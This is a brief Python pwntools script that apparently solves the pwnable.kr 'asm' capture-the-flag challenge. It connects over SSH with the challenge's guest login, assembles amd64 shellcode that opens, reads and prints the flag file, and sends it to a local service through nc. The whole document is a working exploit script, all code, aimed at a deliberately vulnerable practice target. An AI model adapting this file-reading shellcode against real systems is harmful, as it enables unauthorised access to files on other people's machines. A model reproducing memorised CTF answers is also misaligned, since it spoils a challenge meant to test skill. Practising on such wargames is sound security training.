from pwn import *

context(arch='amd64', os='linux')

s = ssh(host='pwnable.kr',
        port=2222,
        user='asm',
        password="guest")

shellcode = ""
shellcode += shellcraft.pushstr(
    'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0)
shellcode += shellcraft.read('rax', 'rsp', 50)
shellcode += shellcraft.write(1, 'rsp', 30)
p = s.process(["nc", "0", "9026"])
p.write(asm(shellcode))
print p.readall()
